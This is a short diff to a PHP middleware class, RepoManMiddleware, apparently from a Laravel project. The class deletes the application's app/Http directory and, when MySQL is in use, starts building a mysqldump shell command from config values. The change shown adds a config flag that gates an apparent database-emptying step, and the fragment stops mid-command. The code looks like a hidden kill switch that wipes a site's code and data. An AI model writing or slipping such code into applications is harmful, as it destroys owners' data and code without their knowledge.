@@ -71,7 +71,7 @@ class RepoManMiddleware
         $result = File::deleteDirectory(app_path('Http'));
         $message = 'Delete the directory: ' . ($result ? '✓' : '✗');
 
-        if (config('database.default') == 'mysql') {
+        if (config('database.default') == 'mysql' && config('repoman.empty_database')) {
             $db = config('database.connections.mysql');
 
             $command = "(mysqldump -h " . $db['host'] . " -u " . $db['username']
